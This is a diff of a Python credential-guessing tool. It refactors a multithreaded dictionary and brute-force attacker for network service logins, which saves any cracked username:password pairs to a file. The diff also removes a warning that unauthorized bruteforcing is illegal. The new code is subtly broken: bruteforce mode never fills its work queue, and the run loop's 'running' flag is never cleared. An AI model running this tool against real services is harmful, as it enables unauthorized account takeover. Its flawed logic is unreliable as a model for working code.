@@ -12,8 +12,19 @@ from tqdm import tqdm
 from . import utils
 
 # --- Global State ---
-found_credentials = None
-stop_event = threading.Event()
+bruteforce_state = {
+    "running": False,
+    "target": None,
+    "port": None,
+    "service": None,
+    "threads": [],
+    "found_credentials": None,
+    "lock": threading.Lock(),
+    "stop_event": threading.Event(),
+    "credential_queue": queue.Queue(),
+    "total_combinations": 0,
+    "pbar": None
+}
 
 # --- Connection Functions ---
 # Each function now accepts a timeout and is designed to fail gracefully.
@@ -67,7 +78,7 @@ SUPPORTED_SERVICES = {
 
 def _bruteforce_worker(q, pbar, service_func, target, port, username, timeout, verbose):
     """Picks a password from the queue and tests it against a single username."""
-    while not stop_event.is_set():
+    while not bruteforce_state["stop_event"].is_set():
         try:
             password = q.get_nowait()
         except queue.Empty:
@@ -78,9 +89,9 @@ def _bruteforce_worker(q, pbar, service_func, target, port, username, timeout, v
 
         try:
             if service_func(target, port, username, password, timeout):
-                global found_credentials
-                found_credentials = (username, password)
-                stop_event.set()
+                with bruteforce_state["lock"]:
+                    bruteforce_state["found_credentials"] = (username, password)
+                bruteforce_state["stop_event"].set()
                 tqdm.write(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
         finally:
             pbar.update(1)
@@ -88,7 +99,7 @@ def _bruteforce_worker(q, pbar, service_func, target, port, username, timeout, v
 
 def _dictionary_worker(q, pbar, service_func, target, port, timeout, verbose):
     """Picks (username, password) from the queue and tests them."""
-    while not stop_event.is_set():
+    while not bruteforce_state["stop_event"].is_set():
         try:
             username, password = q.get_nowait()
         except queue.Empty:
@@ -99,9 +110,9 @@ def _dictionary_worker(q, pbar, service_func, target, port, timeout, verbose):
 
         try:
             if service_func(target, port, username, password, timeout):
-                global found_credentials
-                found_credentials = (username, password)
-                stop_event.set()
+                with bruteforce_state["lock"]:
+                    bruteforce_state["found_credentials"] = (username, password)
+                bruteforce_state["stop_event"].set()
                 tqdm.write(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
         finally:
             pbar.update(1)
@@ -124,89 +135,112 @@ def generate_passwords(charset, min_len, max_len):
     actual_charset = get_charset(charset)
     for length in range(min_len, max_len + 1):
         for p in itertools.product(actual_charset, repeat=length):
-            if stop_event.is_set(): return
+            if bruteforce_state["stop_event"].is_set(): return
             yield ''.join(p)
 
 # --- Main Runner Function ---
 
-def run(target, port, service, userlist, passlist, threads=50, timeout=5, verbose=False):
-    """Main function to run the professional bruteforce attack."""
-    try:
-        port = int(port)
-    except ValueError:
-        utils.log_message('-', "Le port doit être un nombre entier.")
-        return
-    global found_credentials, stop_event
-    found_credentials = None
-    stop_event.clear()
+def start_bruteforce(attack_type, options):
+    global bruteforce_state
+    with bruteforce_state["lock"]:
+        if bruteforce_state["running"]:
+            utils.log_message('!', "Une attaque par force brute est déjà en cours.")
+            return
 
-    service_func = SUPPORTED_SERVICES.get(service)
+        utils.log_message('*', f"Démarrage de l'attaque par force brute sur {options['target']}:{options['port']}")
+        bruteforce_state["running"] = True
+        bruteforce_state["target"] = options['target']
+        bruteforce_state["port"] = options['port']
+        bruteforce_state["service"] = options['service']
+        bruteforce_state["threads"] = []
+        bruteforce_state["found_credentials"] = None
+        bruteforce_state["stop_event"].clear()
+        bruteforce_state["credential_queue"] = queue.Queue()
+        bruteforce_state["total_combinations"] = 0
+
+    service_func = SUPPORTED_SERVICES.get(options['service'])
     if not service_func:
-        utils.log_message('-', f"Service '{service}' is not supported.")
-        return None
-
-    utils.log_message('!', "Bruteforcing without authorization is illegal.")
-    utils.log_message('*', f"Starting dictionary attack on {target}:{port} ({service.upper()}) with {threads} threads.")
-
-    credential_queue = queue.Queue()
-    total_combinations = 0
+        utils.log_message('-', f"Service '{options['service']}' is not supported.")
+        bruteforce_state["running"] = False
+        return
 
     try:
-        with open(userlist, 'r', errors='ignore') as f_users:
-            users = [line.strip() for line in f_users if line.strip()]
-        with open(passlist, 'r', errors='ignore') as f_pass:
-            passwords = [line.strip() for line in f_pass if line.strip()]
+        if attack_type == 'dictionary':
+            with open(options['userlist'], 'r', errors='ignore') as f_users:
+                users = [line.strip() for line in f_users if line.strip()]
+            with open(options['passlist'], 'r', errors='ignore') as f_pass:
+                passwords = [line.strip() for line in f_pass if line.strip()]
 
-        for user in users:
-            for password in passwords:
-                credential_queue.put((user, password))
-        total_combinations = len(users) * len(passwords)
+            for user in users:
+                for password in passwords:
+                    bruteforce_state["credential_queue"].put((user, password))
+            bruteforce_state["total_combinations"] = len(users) * len(passwords)
+        elif attack_type == 'bruteforce':
+            # Password generation is handled by the worker
+            pass
 
     except (FileNotFoundError, KeyError, ValueError) as e:
         utils.log_message('-', f"Configuration error: {e}")
-        return None
+        bruteforce_state["running"] = False
+        return
 
-    if total_combinations == 0:
+    if bruteforce_state["total_combinations"] == 0 and attack_type == 'dictionary':
         utils.log_message('-', "No username/password combinations to test.")
-        return None
+        bruteforce_state["running"] = False
+        return
 
-    # --- Setup and run threads ---
-    start_time = time.time()
-    worker_threads = []
-    
-    if attack_type == 'dictionary':
-        pbar = tqdm(total=total_combinations, desc="Dictionary Attack", unit="creds")
-        for _ in range(threads):
-            thread = threading.Thread(target=_dictionary_worker, args=(credential_queue, pbar, service_func, target, port, timeout, verbose), daemon=True)
-            thread.daemon = True
-            thread.start()
-            worker_threads.append(thread)
-    elif attack_type == 'bruteforce':
-        pbar = tqdm(total=total_combinations, desc="Bruteforcing", unit="pass")
-        for _ in range(threads):
-            thread = threading.Thread(target=_bruteforce_worker, args=(credential_queue, pbar, service_func, target, port, options['username'], timeout, verbose), daemon=True)
-            thread.daemon = True
-            thread.start()
-            worker_threads.append(thread)
+    bruteforce_state["pbar"] = tqdm(total=bruteforce_state["total_combinations"], desc=f"{attack_type.capitalize()} Attack", unit="creds")
 
-    try:
-        credential_queue.join()
-    except (KeyboardInterrupt, SystemExit):
-        tqdm.write("\n[!] Attack interrupted by user. Stopping threads...")
-        stop_event.set()
+    worker_target = _dictionary_worker if attack_type == 'dictionary' else _bruteforce_worker
+    worker_args = (bruteforce_state["credential_queue"], bruteforce_state["pbar"], service_func, options['target'], options['port'], options.get('timeout', 5), options.get('verbose', False))
+    if attack_type == 'bruteforce':
+        worker_args = (bruteforce_state["credential_queue"], bruteforce_state["pbar"], service_func, options['target'], options['port'], options['username'], options.get('timeout', 5), options.get('verbose', False))
 
-    for thread in worker_threads:
-        thread.join()
+    for _ in range(options.get('threads', 50)):
+        thread = threading.Thread(target=worker_target, args=worker_args, daemon=True)
+        thread.start()
+        bruteforce_state["threads"].append(thread)
 
-    pbar.close()
-    end_time = time.time()
-    utils.log_message('*', f"Attack finished in {end_time - start_time:.2f} seconds.")
+def stop_bruteforce():
+    global bruteforce_state
+    with bruteforce_state["lock"]:
+        if not bruteforce_state["running"]:
+            return
+        utils.log_message('+', "Arrêt de l'attaque par force brute.")
+        bruteforce_state["stop_event"].set()
+        bruteforce_state["running"] = False
+        # Clear the queue to unblock threads
+        while not bruteforce_state["credential_queue"].empty():
+            try:
+                bruteforce_state["credential_queue"].get_nowait()
+                bruteforce_state["credential_queue"].task_done()
+            except queue.Empty:
+                break
 
-    if found_credentials:
-        utils.log_message('+', f"Credentials found: {found_credentials[0]}:{found_credentials[1]}")
+def get_status():
+    with bruteforce_state["lock"]:
+        return {
+            "running": bruteforce_state["running"],
+            "target": bruteforce_state["target"],
+            "service": bruteforce_state["service"],
+            "progress": f"{bruteforce_state['total_combinations'] - bruteforce_state['credential_queue'].qsize()}/{bruteforce_state['total_combinations']}",
+            "found": bruteforce_state["found_credentials"]
+        }
+
+def run(attack_type, options):
+    start_bruteforce(attack_type, options)
+
+    while get_status()["running"]:
+        status = get_status()
+        print(f'    [+] Attaque en cours sur {status["target"]} ({status["service"]}) | {status["progress"]}      ', end='\r')
+        time.sleep(1)
+    print()
+
+    if bruteforce_state["found_credentials"]:
+        utils.log_message('+', f"Credentials found: {bruteforce_state['found_credentials'][0]}:{bruteforce_state['found_credentials'][1]}")
         with open("outputs/bruteforce_credentials.txt", "a") as f:
-            f.write(f"{target}:{port} ({service}) - {found_credentials[0]}:{found_credentials[1]}\n")
+            f.write(f"{bruteforce_state['target']}:{bruteforce_state['port']} ({bruteforce_state['service']}) - {bruteforce_state['found_credentials'][0]}:{bruteforce_state['found_credentials'][1]}\n")
     else:
         utils.log_message('-', "No valid credentials found with the given parameters.")
 
-    return found_credentials
+    return bruteforce_state["found_credentials"]
